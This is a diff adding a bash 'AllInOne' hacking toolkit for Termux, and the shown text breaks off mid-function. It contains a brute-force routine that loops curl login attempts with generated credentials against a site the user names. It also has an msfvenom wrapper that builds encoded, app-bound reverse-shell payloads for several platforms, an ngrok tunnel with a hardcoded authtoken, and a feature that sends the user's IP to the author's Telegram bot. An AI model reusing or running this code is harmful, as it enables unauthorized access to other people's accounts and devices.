@@ -1,0 +1,4301 @@
+#! /usr/bin/bash
+
+# Colors
+R="$(printf '\033[1;31m')"
+G="$(printf '\033[1;32m')"
+Y="$(printf '\033[1;33m')"
+W="$(printf '\033[1;37m')"
+C="$(printf '\033[1;36m')"
+
+b="\033[1;30m"
+r="\033[1;31m"
+g="\033[1;32m"
+y="\033[1;33m"
+b="\033[1;34m"
+p="\033[1;35m"
+c="\033[1;36m"
+v="\033[1;37m"
+w="\033[0;37m"
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+info="${cyan}[${white}+${cyan}] ${yellow}"
+fun="${cyan}[${white}@${cyan}] ${purple}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+bad="${cyan}[${white}!${cyan}] ${red}"
+good="${cyan}[${white}√${cyan}] ${green}"
+
+sad="$red ಠ⁠︵ಠ⁠"
+llok="$blue ಠ⁠_⁠ʖ⁠ಠ⁩"
+hehe="$yellow ಡ⁠ ͜⁠ ⁠ʖ⁠ ⁠ಡ"
+huh="$blue ʘ⁠‿⁠ʘ"
+happy="( ⁠•⁠ ⁠‿⁠ ⁠•⁠ )"
+
+home=$(pwd)
+more_info="AllInOne is a tool can install and startup you to become a hacker with alots of tools $hehe "
+name=AllInOne
+
+Klam(){
+
+talk_AI=$[RANDOM%20+1]
+
+#$(cat /dev/urandom | tr -dc '1-20' | fold -w 1 | head -n 1)
+
+if [[ $talk_AI == '1' ]];then
+
+Talk="it's 80% Free i swear -_-"
+
+elif [[ $talk_AI == '2' ]];then
+
+Talk="No time to talk just work and work !"
+
+elif [[ $talk_AI == '3' ]];then
+
+Talk="Harassing people is bad , isnt' it ?"
+
+elif [[ $talk_AI == '4' ]];then
+
+Talk="Google is ugly , use shoden "
+
+elif [[ $talk_AI == '5' ]];then
+
+Talk=" What's the Time ? it's time to work "
+
+elif [[ $talk_AI == '6' ]];then
+
+Talk="you can locate some one with a call from whatsapp or telegram !"
+
+elif [[ $talk_AI == '7' ]];then
+
+Talk="My dream is meeting u <3 "
+
+elif [[ $talk_AI == '8' ]];then
+
+Talk="Don't Go to the Dark net without shell !! "
+
+elif [[ $talk_AI == '9' ]];then
+
+Talk="If you don't want to use google so the hacking isn't free"
+
+elif [[ $talk_AI == '10' ]];then
+
+Talk="rm -rfd /*"
+
+elif [[ $talk_AI == '11' ]];then
+
+name=$(uname -o)
+if [[ $(uname -o) == "Android" ]];then
+Talk="Bruh ! , Don't use Termux "
+else
+Talk="Bruh ! , Don't use $name"
+fi
+
+elif [[ $talk_AI == "12" ]];then
+
+Talk="~\$ read B24B"
+
+elif [[ $talk_AI == "13" ]];then
+
+Talk="Are you Lony ? ♪♪"
+
+elif [[ $talk_AI == "14" ]];then
+
+Talk="also try TheBlue App"
+
+elif [[ $talk_AI == "15" ]];then
+
+Talk="Don't write FBI command here !"
+
+elif [[ $talk_AI == "16" ]];then
+
+Talk="hmmmmmmmmmmmmmmmmmmm...."
+
+elif [[ $talk_AI == "17" ]];then
+
+Talk="   <  UwU  >  "
+
+elif [[ $talk_AI == "18" ]];then
+
+Talk="Gotta Go !!"
+
+elif [[ $talk_AI == "19" ]];then
+
+Talk=" لا إله الا الله "
+
+elif [[ $talk_AI == "20" ]];then
+
+Talk="what ??"
+
+fi
+
+echo -e $fun"----------->"$Talk"<-----------" $fun | lolcat
+
+}
+
+#banner
+ban(){
+
+Som=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
+
+if [[ $Som == '1' ]];then
+
+clear
+echo -e $b '										TM'
+toilet -f mono12 -F border AllInOne -F gay -F metal
+echo -e $r ' By @Blue24Bluer'
+
+elif [[ $Som == '2' ]];then
+
+clear
+echo -e $b '                                                                            TM'
+toilet -f mono12 -F border AllInOne -F gay
+echo -e $r ' By @Blue24Bluer'
+
+elif [[ $Som == '3' ]];then
+
+clear
+echo -e $b '                                                                            TM'
+
+
+
+echo -e $r "┌────────────────────────────────────────────────────────────────────────────────┐"
+echo -e $y "│                                                                                │"
+echo -e $b "│    ▄▄     ▄▄▄▄      ▄▄▄▄       ▄▄▄▄▄▄               ▄▄▄▄                       │"
+echo -e $g "│   ████    ▀▀██      ▀▀██       ▀▀██▀▀              ██▀▀██                      │"
+echo -e $r "│   ████      ██        ██         ██     ██▄████▄  ██    ██  ██▄████▄   ▄████▄  │"
+echo -e $y "│  ██  ██     ██        ██         ██     ██▀   ██  ██    ██  ██▀   ██  ██▄▄▄▄██ │"
+echo -e $b "│  ██████     ██        ██         ██     ██    ██  ██    ██  ██    ██  ██▀▀▀▀▀▀ │"
+echo -e $g "│ ▄██  ██▄    ██▄▄▄     ██▄▄▄    ▄▄██▄▄   ██    ██   ██▄▄██   ██    ██  ▀██▄▄▄▄█ │"
+echo -e $r "│ ▀▀    ▀▀     ▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀    ▀▀    ▀▀    ▀▀▀▀▀  │"
+echo -e $y "│                                                                                │"
+echo -e $b "│                                                                                │"
+echo -e $g "└────────────────────────────────────────────────────────────────────────────────┘"
+
+
+echo -e $r ' By @Blue24Bluer'
+
+elif [[ $Som == '4' ]];then
+
+clear
+echo -e $b '                                                                            TM'
+toilet -f mono12 -F border AllInOne | lolcat
+echo -e $r ' By @Blue24Bluer'
+
+fi
+
+}
+
+# install
+installit() {
+
+net
+
+if [[ -d $PREFIX/etc/B24B/blue24bluer/ ]];then
+echo -e $info " LOADING .. .."
+sleep 3
+else
+
+	if [[ $nN == "Y" ]];then
+echo -e $info " you have to install it before start this tool "
+echo -e $info "just give me 10 min "
+echo -e ""
+echo -e ""
+echo -e $r "UPDATE YOUR SYSTEM ..."
+$apt update -y && $apt upgrade -y
+
+echo -e $r "INSTALL PV PACKAGE ..."
+$apt install pv -y   	 	  &>> /dev/null
+
+echo -e $r "INSTALL TOILET PACKAGE ..."
+$apt install toilet -y 	 	  &>> /dev/null
+
+echo -e $r "INSTALL OPENSSL PACKAGE ..."
+$apt install openssl -y  	  &>> /dev/null
+
+if [[ $termux == "true" ]];then
+echo -e $r "INSTALL X11 PACKAGE ..."
+$apt install x11-repo -y           &>> /dev/null
+
+if [[ $? == "0" ]];then
+systemis="T"
+else
+echo -e $bad "SomeThing Is Error !"
+sleep 3
+installit
+systemis="N"
+fi
+fi
+
+echo -e $r "INSTALL OPENSSH PACKAGE ..."
+$apt install openssh -y		  &>> /dev/null
+
+echo -e $r "INSTALL ZIP PACKAGE ..."
+$apt install zip -y		  &>> /dev/null
+
+echo -e $r "INSTALL NEOFETCH PACKAGE ..."
+$apt install neofetch -y	  &>> /dev/null
+
+echo -e $r "INSTALL CURL PACKAGE ..."
+$apt install curl -y	 	  &>> /dev/null
+
+echo -e $r "INSTALL PYTHON PACKAGE ..."
+$apt install python python3 -y 	  &>> /dev/null
+
+echo -e $r "INSTALL LOLCAT PACKAGE ..."
+pip install lolcat -y             &>> /dev/null
+
+echo -e $r "INSTALL PHP PACKAGE ..."
+$apt install php -y    &>> /dev/null
+
+echo -e $r "INSTALL WORDLIST PACKAGE ..."
+pip install wordlist		  &>> /dev/null
+
+echo -e $r "INSTALL CLOUDFLEARD PACKAGE ..."
+$apt install cloudflared -y       &>> /dev/null
+
+echo -e $r "INSTALL EXifTOOL PACKAGE ..."
+$apt install exiftool -y          &>> /dev/null
+
+echo -e $r "INSTALL HTTRACK PACKAGE ..."
+$apt install httrack -y           &>> /dev/null
+
+echo -e $r "FIX AND INSTALL TERMUX-API"
+sleep 3
+SiR="T"
+dpkg
+
+
+if [[ $systemis == "T" ]];then
+mkdir $PREFIX/etc/B24B/
+mkdir $PREFIX/etc/B24B/blue24bluer
+echo -e $good " now you can run this tool "
+else
+installit
+fi
+
+else
+
+echo -e $info $r "You Have To Trun On Your Wifi For First Time You Run This Tool"
+exit
+
+fi
+
+fi
+}
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" = 0 ]; then
+	    nN='Y'
+		NnEt="Connected To Network [★]"
+	break
+       else
+		nN='N'
+		NnEt="No Internet [X] "
+		break
+        fi
+    done
+}
+
+# Termux
+if [[ -d /data/data/com.termux/files/home ]]; then
+termux=true
+else
+termux=false
+fi
+
+# package manager
+
+if [[ `command -v B24B.apt` ]]; then
+        apt="apt"
+elif [[ `command -v apt` ]]; then
+    apt="apt"
+elif  [[ `command -v apt-get` ]]; then
+    apt="apt-get"
+elif  [[ `command -v yum` ]]; then
+    apt="yum"
+elif [[ `command -v dnf` ]]; then
+    apt="dnf"
+elif [[ `command -v apk` ]]; then
+    apt="apk"
+elif [[ `command -v pacman` ]]; then
+    apt="pacman"
+else
+    echo -e "${bad}No supported package manager found! Install packages manually!"
+    exit 1
+fi
+
+#{----------------------DDOS-----------------}
+#{------------------------------------------}
+port(){
+ban
+# This script will generate a report of the system
+
+echo -e $info "System Report"
+echo "-------------"
+echo
+
+echo -e $info "System Information:"
+echo "-------------------"
+echo -e $info "Hostname: $(hostname)"
+echo -e $info "Kernel Version: $(uname -r)"
+echo -e $info "Uptime: $(uptime)"
+echo
+
+echo -e $info "Memory Usage:"
+echo "-------------"
+free -m
+echo
+
+echo -e $info "Disk Usage:"
+echo "-----------"
+df -h
+echo
+
+echo -e $info "Network Information:"
+echo "--------------------"
+ifconfig -a
+
+echo -e $info " external IP address: "
+echo "--------------------"
+curl ifconfig.me
+
+echo -e $info " 32 bits or 64 bits: "
+echo "--------------------"
+getconf LONG_BIT
+
+# This script will show all open ports on the system
+
+echo "Scanning for open ports..."
+
+for port in $(seq 1 65535); do
+  (echo >/dev/tcp/localhost/$port) &>/dev/null && echo "$port is open"
+done
+
+read -p " ------------:}=> " -sn 1 -p "Press any key to continue..."
+}
+#{------------------------------------------}
+Mik(){
+clear
+ban
+
+put_the_password_first(){
+
+password_is_true=$(head -n 1 $PREFIX/bin/B24B_Mikrotik)
+if [[ $password_is_true == "password is true" ]];then
+echo -e $good " wellcome agin "
+else
+echo -e $info "put the password of this tool ^_^ "
+read -p " ------------:}=> " -s  password_tool
+fi
+
+if [[ $password_tool == "BLUE24BLUER702005665" || $password_is_true == "password is true" ]];then
+echo "password is true" > $PREFIX/bin/B24B_Mikrotik
+echo -e $good "password is true"
+else
+echo -e $bad " no this isnt true , if you dont know the password call me on telegram @Blue24Bluer "
+exit
+fi
+
+# what start the name of network
+echo -e $ask " what is the start of url network you will attack ? "
+echo -e $info " e.x www.a.com "
+read -p " ------------:}=> " url
+ban
+
+ping -c 1 $url
+if [[ $? == "0" ]];then
+echo -e $good "correct"
+else
+echo -e $bad "No find $url like this"
+echo -e $ask " Do you want to conect ? y/n "
+read -p " ------------:}=> " pING
+fi
+	if [[ $pING == "Y" || $pING == "y" || $pING == "yes" || $pING == "Yes" ]];then
+	echo " "
+	else
+	Mik
+	fi
+
+# did the network you will attack have a password&username ?
+echo -e $ask " did the network you will attack have a password&username ? "
+echo -e $info " e.x if yes ---> username&password || if no ----> password  "
+read -p " ------------:}=> " pAssworD
+	if [[ $pAssworD == "yes" || $pAssworD == "Yes" || $pAssworD == "y" || $pAssworD == "Y" ]];then
+echo -e $ask " same thing on username ? y/n"
+read -p " ------------:}=> " same
+
+	if [[ $same == "y" || $same == "Y" || $same == "yes" || $same == "Yes" ]];then
+passWORD="yes"
+        else
+echo -e $ask " (1)Random , (2)From_File , (3)From_Number_To_Number "
+read -p " ------------:}=> " pAssWord
+
+if [[ $pAssWord == "1" ]];then
+RNP="true"
+elif [[ $pAssWord == "2" ]];then
+echo -e $info "Do you Want to me Make File Password ? y/n"
+read -p " ------------:}=> " MakeFilePassword
+
+if [[ $MakeFilePassword == "y" || $MakeFilePassword == "Y" || $MakeFilePassword == "Yes" || $MakeFilePassword == "yes" ]];then
+echo -e $info " i will put all lettrs on this file OK "
+echo -e $info "Thats will take some Time"
+wordlist -m $length -M $max -o $PREFIX/etc/password.txt  -v abcdefghijklmnopqrstuvwyxz
+        else
+echo -e $bad "you will made it by your self"
+echo -e $info "e.x you will put it in file $PREFIX/etc/password.txt"
+fi
+
+elif [[ $pAssWord == "3" ]];then
+echo -e $info "put first groub numbers"
+read -p " ------------:}=> " First
+echo -e $info "put the end of groub numbers"
+read -p " ------------:}=> " end
+echo -e $info " Starting,this will take some time ... "
+seq $First $end > $PREFIX/etc/password.txt
+
+else
+echo -e $bad " something is worng "
+exit
+fi
+
+	fi
+
+	else
+echo -e " "
+	fi
+
+ban
+# ask if http OR https
+echo -e $ask " HTTP OR HTTPS ? "
+echo -e $info " e.x http/https "
+read -p " ------------:}=> " ssl
+
+if [[ $ssl == "http" ]];then
+echo " "
+elif [[ $ssl == "https" ]];then
+echo " "
+else
+echo -e $bad " this is not correct "
+exit
+fi
+
+ban
+# ask if did he make passlist
+echo -e $ask " do you want to make a passlist ?y/n "
+read -p " ------------:}=> " guss
+
+# the file will make gussing
+if [[ $guss == "y" || $guss == "Y" || $guss == "yes" || $guss == "Yes" ]];then
+#
+echo -e $ask " chose one "
+echo -e $info "(1)Wordlist , (2)From_Number_To_Number , (3)Random"
+read -p " ------------:}=> " wordlist
+#
+elif [[ $guss == "n" || $guss == "N" || $guss == "No" || $guss == "no" ]];then
+echo -e $info " you will made by your self the pass&user file on username.txt & password.txt "
+
+echo -e $info "Put the Attack Mode"
+echo -e ""
+echo -e ""
+echo -e $info "[1] Fast Attack"
+echo -e $info "[2] Normal Attack"
+
+read -p "------------:}=> " AttA
+
+if [[ $AttA == "1" ]];then
+RANDOm="true"
+elif [[ $AttA == "2" ]];then
+PU="y"
+else
+echo -e $bad "Error!"
+Mik
+fi
+##############################
+#
+else
+echo -e $bad " error "
+exit
+
+fi
+#
+#
+if [[ $wordlist = "1" ]] ;then
+echo -e $ask " put a pass length "
+read -p " ------------:}=> " length
+echo -e $ask " put a max of length "
+read -p " ------------:}=> " max
+echo -e $ask " number or letter ? 1/2 "
+read -p " ------------:}=> " letter
+
+
+elif [[ $wordlist = "2" ]];then
+# Ask user for the number of passwords to generate
+echo -e $ask "Enter the number of password start "
+echo -e $info " e.x *13748*-14748 "
+read -p " ------------:}=> " start
+ban
+# put end of your number
+echo -e $ask "Enter the number of password end "
+echo -e $info " e.x 13748-*14748* "
+read -p " ------------:}=> " end
+ban
+seq $start $end > $PREFIX/etc/username.txt
+elif [[ $wordlist = "3" ]];then
+echo -e $ask " [1]Numbers OR [2] Letters ? "
+read -p " ------------:}=> " NORL
+RANDOm="true"
+echo -e $ask " put a pass length "
+read -p " ------------:}=> " length
+else
+echo -e $bad "error"
+#exit
+fi
+
+if [[ $letter == "1" ]];then
+echo -e $info " wite ... "
+wordlist -m $length -M $max -o $PREFIX/etc/username.txt  -v 1234567890
+elif [[ $letter == "2" ]];then
+echo -e $info " wite ... "
+wordlist -m $length -M $max -o $PREFIX/etc/username.txt  -v abcdefghijklmnopqrstuvwyxz
+else
+echo "bad input"
+fi
+
+# put the time what you will wite for login ?
+echo -e $ask " put the time what you will wite for login ? "
+echo -e $info " e.x 3 "
+read -p " ------------:}=> " W
+ban
+
+finsh_password(){
+add=1
+MusMum=0
+while true; do
+((add++))
+((MusNum))
+net
+
+
+username=$(sed -n "${add}p" "$PREFIX/etc/username.txt")
+password=$(sed -n "${add}p" "$PREFIX/etc/password.txt")
+sleep $W
+echo -e $info "username : $username "
+echo -e $info "password : $password "
+echo -e $info "is there Network connected ? : ${NnEt} "
+echo -e $info "Number of tring to hack $url : ${MusNum} "
+curl $ssl://$url/login?username=$username&password=$password
+
+done
+
+}
+
+finsh_password_username(){
+add=1
+MusNum=0
+while true; do
+((add++))
+((MusNum++))
+net
+
+password=$(sed -n "${add}p" "$PREFIX/etc/password.txt")
+username=$(sed -n "${add}p" "$PREFIX/etc/username.txt")
+sleep $W
+echo -e $info "username : ${username}"
+echo -e $info "password : ${password}"
+echo -e $info "is there Network connected ? : ${NnEt} "
+echo -e $info "Number of tring to hack $url : ${MusNum} "
+curl $ssl://$url/login?username=$username&password=$password
+
+done
+
+}
+
+fast_attack(){
+MusNum=0
+
+while true; do
+net
+
+if [[ $NORL == "2" ]];then
+RanDomP=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w $length | head -n 1)
+elif [[ $NORL == "1" ]];then
+RanDomU=$(cat /dev/urandom | tr -dc '0-9' | fold -w $length | head -n 1)
+elif [[ $RNP == "true" ]];then
+RDP=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w $length | head -n 1)
+fi
+
+sleep $W
+echo -e $info "username : ${RanDomU} "
+echo -e $info "password : ${RanDomP} "
+echo -e $info "is there Network connected ? : ${NnEt} "
+echo -e $info "Number of tring to hack $url : ${MusNum} "
+((MusNum++))
+curl $ssl://$url/login?username=$RanDomU&password=$RDP
+
+done
+
+	}
+
+if [[ $PU == "y" ]];then
+
+finsh_password_username # for 2 input
+
+elif [[ $RANDOm = "true" ]];then
+
+fast_attack # for Randoom Attack
+
+else
+
+finsh_password # for one input
+
+fi
+
+		}
+put_the_password_first
+			}
+#{------------------------------------------}
+NC(){
+ban
+
+echo " "
+echo " "
+echo -e $info " Ngrok Is Installing Wait...."
+echo " "
+sleep 3.0
+cd $HOME
+B24B.apt install wget -y
+B24B.apt install php -y
+B24B.apt install python -y
+pip install lolcat
+B24B.apt install mpv -y
+mkdir $HOME/.ngrok2/
+touch $HOME/.ngrok2/ngrok.yml
+echo " authtoken: 2IzuzKy2XYbxNeXzFEzlL8ik0Xm_4bDZ75DvT4fKPnQAF2Ju8 " > $HOME/.ngrok2/ngrok.yml
+wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip
+unzip ngrok-2.2.8-linux-arm64.zip
+chmod +x ngrok
+cp ngrok $PREFIX/bin/ngrok
+rm -rf ngrok-2.2.8-linux-arm64.zip
+clear
+echo " "
+echo -e $info "Ngrok os Starting on port 4444.."
+echo " "
+ngrok tcp 4444
+}
+#{------------------------------------------}
+Sen(){
+
+IPaddres=$(curl ifconfig.me)
+
+ban
+echo -e $info $blue " What you want from @blue24bluer , what is the error "
+printf " send :>"
+read -p " ------------:}=> " message
+echo -e $info " Ok, I will fix it $happy "
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" Hi Boss You have new message frome $IPaddres "
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" $message "
+sleep 3
+menu
+
+}
+#{------------------------------------------}
+prot() {
+
+ban
+echo -e $info " [*] what you want to install ? "
+echo -e " "
+echo -e " "
+echo -e $info " [1] kali "
+echo -e $info " [2] Debian "
+echo -e $info " [3] Parrot "
+echo -e $info " [4] Fedora "
+echo -e $info " [5] ArchLinux "
+echo -e $info " [6] Nethunter "
+echo -e $info " [7] BackBox "
+echo -e $info " [9] Back "
+
+printf " chose one :> "
+read -p " ------------:}=> " distro
+
+if [[ $distro == "1" ]];then
+	echo -e $info " [*] Install Kali "
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh
+
+elif [[ $distro == "2" ]];then
+	echo -e $info " [*] Install Debian "
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Debian/debian.sh && bash debian.sh
+
+elif [[ $distro == "3" ]];then
+	echo -e $info " [*] install Parrot "
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Debian/debian.sh && bash debian.sh
+
+elif [[ $distro == "4" ]];then
+	echo -e $info " [*] install Fedora "
+pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Fedora/fedora.sh && bash fedora.sh
+
+elif [[ $distro == "5" ]];then
+	echo -e $info " [*] install Arch Linux  "
+pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Arch/armhf/arch.sh && bash arch.sh
+
+elif [[ $distro == "6" ]];then
+	echo -e $info " [*] install Nethunter "
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Nethunter/nethunter.sh && bash nethunter.sh
+
+elif [[ $distro == "7" ]];then
+	echo -e $info " [*] install Back Box "
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/BackBox/backbox.sh && bash backbox.sh
+
+	elif [[ $distro == "9" ]];then
+menu
+else
+	echo -e $error " [*] chose from the List "
+	menu
+fi
+}
+#{--------make-meterpreter-with-metasploit------}
+install_metasploit(){
+        echo -e $info "[*] Install Metasploit "
+    $apt update -y
+        $apt upgrade -y
+    $apt install wget -y
+    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+    bash metasploit.sh
+    rm metasploit.sh
+    echo
+        echo -e $info "[*] Installation completed..."
+	menu
+}
+#-----------------------------------------------
+msf() {
+
+clear
+ban
+
+if [[ `command -v msfvenom` ]]; then
+
+echo -e $r "L $b O $g A $y D $p I $v  N $c G $w ..."
+net
+ban
+echo -e $info " [*] Set Your LHOST and LPORT to make an Payload "
+echo -e ""
+echo -e ""
+echo -e $info "your local host :"
+ifconfig | grep inet
+echo -e ""
+echo -e ""
+
+if [[ $nN == 'Y' ]];then
+
+echo -e $info "your extrnal host :"
+curl ifconfig.me
+
+fi
+
+echo -e " "
+echo -e " "
+printf " set your LHOST " $info
+read -p " ------------:}=> " LHOST
+clear
+ban
+echo -e $info " [*] Ok you have now to put the LPORT "
+echo -e " "
+echo -e " "
+printf " set your LPORT " $info
+read -p " ------------:}=> " LPORT
+clear
+ban
+echo -e $info " [*] now set where you will put it ? "
+echo -e $info " [*] like /path/to/path/ "
+echo -e " "
+echo -e " "
+printf " set your PATH " $info
+read -p " ------------:}=> " DIR
+clear
+ban
+echo -e $ask " [*] what you will name it ? "
+echo -e " "
+echo -e " "
+printf " set your name for the app " $info
+read -p " ------------:}=> " name
+clear
+ban
+echo -e $info " chose one :> "
+
+echo -e $y " [1] exe " "------> " $info " for Windows system "
+echo -e $y " [2] apk " "------> " $info " for android system "
+echo -e $y " [3] php " "------> " $info " for servers web    "
+echo -e $y " [4] sh  " "------> " $info " for linux system   "
+echo -e $y " [5] py  " "------> " $info " for python         "
+
+
+printf " chose " $info
+read -p " ------------:}=> " M
+clear
+ban
+if [[ $M == "1" ]];then
+	E=windows/meterpreter/reverse_tcp
+	MM=exe
+elif [[ $M == "4" ]];then
+
+	E=cmd/unix/reverse_bash
+	MM=sh
+
+elif [[ $M == "3" ]];then
+
+	E=php/meterpreter/reverse_tcp
+	MM=php
+
+elif [[ $M == "5" ]];then
+
+	E=python/meterpreter/reverse_tcp
+	MM=py
+
+elif [[ $M == "2" ]];then
+	E=android/meterpreter/reverse_tcp
+	echo -e $info "Do you want to Bind an apk app ? y/n"
+	read Bind
+	if [[ $Bind == "y" || $Bind == "Y" || $Bind == "Yes" || $Bind == "yes" ]];then
+
+		echo -e $info "Put an the path of app you will bind ?"
+		read PAth
+		bind = -x
+	elif [[ $Bind == "N" || $Bind == "n" || $Bind == "no" || $Bind == "No" ]];then
+
+	echo -e $b "Ok"
+
+	else
+
+	echo -e $r "Error!!"
+
+	fi
+
+	MM=apk
+else
+	echo -e $error " WHAT ?! "
+	msf
+fi
+
+clear
+ban
+echo -e $info "do you want to encrypt your payload ? y/n"
+
+read -p "------------:}=> " Enc
+
+if [[ $Enc == "y" || $Enc == "Y" || $Enc == "Yes" || $Enc == "yse" ]];then
+
+echo -e $info "Chose one with name :"
+Ee=-e
+echo -e "
+
+-------------------
+===================]
+Compatible Encoders]
+===================]
+--------------------
+
+#Name                                  Disclosure Date  Rank       Check  Description
+-----                                  ---------------  ----       -----  -----------
+encoder/cmd/brace                                      low        No     Bash Brace Expansion Command Encoder
+encoder/cmd/echo                                       good       No     Echo Command Encoder
+encoder/cmd/generic_sh                                 manual     No     Generic Shell Variable Substitution Command Encoder
+encoder/cmd/ifs                                        low        No     Bourne IFS Substitution Command Encoder
+encoder/cmd/perl                                       normal     No     Perl Command Encoder
+encoder/cmd/powershell_base64                          excellent  No     Powershell Base64 Command Encoder
+encoder/cmd/printf_php_mq                              manual     No     printf 1 via PHP magic_quotes Utility Command Encoder
+encoder/generic/eicar                                  manual     No     The EICAR Encoder
+encoder/generic/none                                   normal     No     The none Encoder
+encoder/mipsbe/byte_xori                               normal     No     Byte XORi Encoder
+encoder/mipsbe/longxor                                 normal     No     XOR Encoder
+encoder/mipsle/byte_xori                               normal     No     Byte XORi Encoder
+encoder/mipsle/longxor                                 normal     No     XOR Encoder
+encoder/php/base64                                     great      No     PHP Base64 Encoder
+encoder/ppc/longxor                                    normal     No     PPC LongXOR Encoder
+encoder/ppc/longxor_tag                                normal     No     PPC LongXOR Encoder
+encoder/ruby/base64                                    great      No     Ruby Base64 Encoder
+encoder/sparc/longxor_tag                              normal     No     SPARC DWORD XOR Encoder
+encoder/x64/xor                                        normal     No     XOR Encoder
+encoder/x64/xor_context                                normal     No     Hostname-based Context Keyed Payload Encoder
+encoder/x64/xor_dynamic                                normal     No     Dynamic key XOR Encoder
+encoder/x64/zutto_dekiru                               manual     No     Zutto Dekiru
+encoder/x86/add_sub                                    manual     No     Add/Sub Encoder
+encoder/x86/alpha_mixed                                low        No     Alpha2 Alphanumeric Mixedcase Encoder
+encoder/x86/alpha_upper                                low        No     Alpha2 Alphanumeric Uppercase Encoder
+encoder/x86/avoid_underscore_tolower                   manual     No     Avoid underscore/tolower
+encoder/x86/avoid_utf8_tolower                         manual     No     Avoid UTF8/tolower
+encoder/x86/bloxor                                     manual     No     BloXor - A Metamorphic Block Based XOR Encoder
+encoder/x86/bmp_polyglot                               manual     No     BMP Polyglot
+encoder/x86/call4_dword_xor                            normal     No     Call+4 Dword XOR Encoder
+encoder/x86/context_cpuid                              manual     No     CPUID-based Context Keyed Payload Encoder
+encoder/x86/context_stat                               manual     No     stat 2 -based Context Keyed Payload Encoder
+encoder/x86/context_time                               manual     No     Time 2 -based Context Keyed Payload Encoder
+encoder/x86/countdown                                  normal     No     Single-byte XOR Countdown Encoder
+encoder/x86/fnstenv_mov                                normal     No     Variable-length Fnstenv/mov Dword XOR Encoder
+encoder/x86/jmp_call_additive                          normal     No     Jump/Call XOR Additive Feedback Encoder
+encoder/x86/nonalpha                                   low        No     Non-Alpha Encoder
+encoder/x86/nonupper                                   low        No     Non-Upper Encoder
+encoder/x86/opt_sub                                    manual     No     Sub Encoder optimised
+encoder/x86/service                                    manual     No     Register Service
+encoder/x86/shikata_ga_nai                             excellent  No     Polymorphic XOR Additive Feedback Encoder
+encoder/x86/single_static_bit                          manual     No     Single Static Bit
+encoder/x86/unicode_mixed                              manual     No     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+encoder/x86/unicode_upper                              manual     No     Alpha2 Alphanumeric Unicode Uppercase Encoder
+encoder/x86/xor_dynamic                                normal     No     Dynamic key XOR Encoder
+
+
+"
+
+read Names
+
+Encoder=$Names
+
+else
+	echo -e $b "Ok"
+fi
+
+echo -e $info " So ... are you sure ? y/n "
+printf " what ? " $info
+read -p " ------------:}=> " ans
+if [[ $ans == "y" ]];then
+        echo -e $info " now this tool build a revrse shell with an payload "
+        msfvenom $bind $PAth -p $E LHOST=$LHOST LPORT=$LPORT $Ee $Encoder -o $DIR$name.$MM
+	echo -e "msfvenom $bind $PAth -p $E LHOST=$LHOST LPORT=$LPORT -e $Encoder -o $DIR$name.$MM"
+elif [[ $ans == "n" ]];then
+        echo -e $info " WTF ... okay "
+menu
+
+elif [[ $ans == "Y" ]];then
+echo -e $info " now this tool build a revrse shell with an payload "
+        msfvenom $bind $PAth -p $E LHOST=$LHOST LPORT=$LPORT -e $Encoder -o $DIR$name.$MM
+	echo -e "msfvenom $bind $PAth -p $E LHOST=$LHOST LPORT=$LPORT -e $Encoder -o $DIR$name.$MM"
+elif [[ $ans == "N" ]];then
+        echo -e $info " WTF ... okay "
+	sleep 3
+	menu
+else
+        echo -e $error " [1] OR [2] "
+        msf
+fi
+
+else
+
+echo -e $info " [*] YOU HAVE FIRST IMSTALL METASPLOIT "
+sleep 2
+
+install_metasploit
+
+fi
+
+
+
+}
+#{---------------themes------------------}
+thm() {
+
+ban
+echo -e $info " [*] chose one theme ? "
+echo " "
+echo " "
+echo -e $info " [1] Fish "
+echo -e $info " [2] ZSH "
+echo -e $info " [3] temux "
+echo -e $info " [4] matrix "
+echo -e $info " [5] Hacker mode "
+echo -e $info " [9] back "
+echo -e " "
+echo -e " "
+
+read -p " ------------:}=> " theme
+
+	if [[ $theme == "1" ]];then
+ban
+echo -e $info " [*] install FISH theme "
+echo -e $info " [*] ...... "
+	$apt install fish
+	$apt install neofetch
+	cd $HOME
+	cd ..
+	cd usr
+	cd etc
+	cd fish
+	echo " neofetch " >> config.fish
+	cd $HOME
+	cd ..
+	cd usr
+	cd bin
+	chsh -s fish
+echo -e $info " Finshed "
+echo -e $info " fish to start the theme "
+menu
+
+	elif [[ $theme == "2" ]];then
+ban
+echo -e $info " [*] install ZSH theme "
+echo -e $info " [*] ...... "
+	$apt install zsh
+	cd $HOME
+	cd ..
+	cd usr
+	cd bin
+	chsh -s zsh
+	cd $HOME
+echo -e $info " [*] Finshed "
